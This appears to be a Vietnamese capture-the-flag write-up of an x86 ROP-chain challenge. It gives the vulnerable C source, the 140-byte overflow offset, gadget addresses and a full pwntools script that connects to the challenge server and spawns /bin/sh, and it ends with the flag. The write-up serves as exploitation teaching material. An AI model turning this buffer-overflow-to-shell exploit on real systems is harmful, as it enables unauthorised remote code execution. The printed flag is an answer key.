## ROPchain - x86 - ROP chains: nc 45.122.249.68 10002

Đầu tiên ta có source code của file thực thi như sau:
```C
#include <stdio.h>

char shell[] = "/bin/sh";
void SetBuf(){
	setvbuf(stdout,0,_IONBF,0);
	setvbuf(stdin,0,_IONBF,0);
	setvbuf(stderr,0,_IONBF,0);
}
void Vuln(){
	char buf[128];
        puts("Insert ROP chain here:");
        read (0, &buf,0x100);
}
int main(){
	SetBuf();
	puts("Wanna.One");
	puts("Muon gioi phai lam viec kho");
	Vuln();
	return 0;
}
```
Ta thấy biến buf có 128 byte và stack frame thì cần 12 byte nữa để tới return address, vì vậy payload của ta sẽ có dạng:
```
"A" * 140 + [chuỗi ROP]
```

Để gọi và thực thi system("/bin/sh") ta cần thực hiện tìm các chain có kiểu:
```assembly
pop eax;
ret;
```
![image](https://user-images.githubusercontent.com/64201705/122765098-59fe5900-d2ca-11eb-89b6-df9995cbd1d3.png)

câu lệnh này nằm ở địa chỉ 
```python
0x080a89e6 : pop eax ; ret
```

tiếp tục ta tìm kiếm chuỗi pop edx, ecx, ebx và ret:
câu lệnh này nằm ở địa chỉ
```python
0x0806e051 : pop edx ; pop ecx ; pop ebx ; ret
```

tiếp theo ta sẽ tìm hai câu lệnh để gọi systemcall là int 0x80 và /bin/sh

![image](https://user-images.githubusercontent.com/64201705/122765787-0cceb700-d2cb-11eb-8f5e-143c4ed28106.png)

Hai câu lệnh này lần lượt nằm tại các địa chỉ:
```python
0x080d9068 : /bin/sh
0x080495a3 : int 0x80
```

Như vậy ta đã đủ số lượng câu lệnh để thực hiện gọi shell:
Thực hiện code python:
```python
from pwn import *

p = remote('45.122.249.68',10002)

pop_eax_ret = 0x080a89e6
pop_edx_ecx_ebx_ret = 0x0806e051
int_0x80 = 0x080495a3
binsh = 0x080d9068
payload = "A"*140
payload += p32(pop_eax_ret)
payload += p32(0xb)
payload += p32(pop_edx_ecx_ebx_ret)
payload += p32(0)
payload += p32(0)
payload += p32(binsh)
payload += p32(int_0x80)
p.sendline(payload)
p.interactive()
```

```bash
python2 test.py
```

Ta được:
![image](https://user-images.githubusercontent.com/64201705/122766124-5ddeab00-d2cb-11eb-87d7-3a17582ef7e0.png)

Như vậy flag là:
```
flag{dung_thay_hoa_no_ma_ngo_xuan_ve}
```
